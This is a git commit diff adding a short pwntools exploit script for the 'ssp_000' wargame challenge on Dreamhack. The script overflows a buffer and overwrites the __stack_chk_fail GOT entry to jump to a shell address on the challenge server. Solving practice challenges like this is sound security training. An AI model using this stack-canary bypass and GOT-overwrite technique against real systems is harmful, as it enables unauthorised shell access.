b9f7b150676f44b9882bd42621b7a6f9b6e35b13
Your Name <you@example.com>
2020-09-14 13:55:47 +0900

    t

--- dreamhack/ssp-000/ex.py
+++ dreamhack/ssp-000/ex.py
@@ -1,3 +1,15 @@
 from pwn import *
-
-p = remote()
+import time
+context.update(log_level='debug')
+p = remote('host1.dreamhack.games', 8589)
+e = ELF('ssp_000')
+addr_got_ssp = e.got['__stack_chk_fail']
+addr_shell = 0x4008EA
+p.recvrepeat(1)
+p.sendline('a'*0x80)
+p.recvrepeat(1)
+#raw_input('debug: ' + str(p.pid))
+p.sendline(str(addr_got_ssp))
+p.recvrepeat(1)
+p.sendline(str(addr_shell))
+p.interactive()
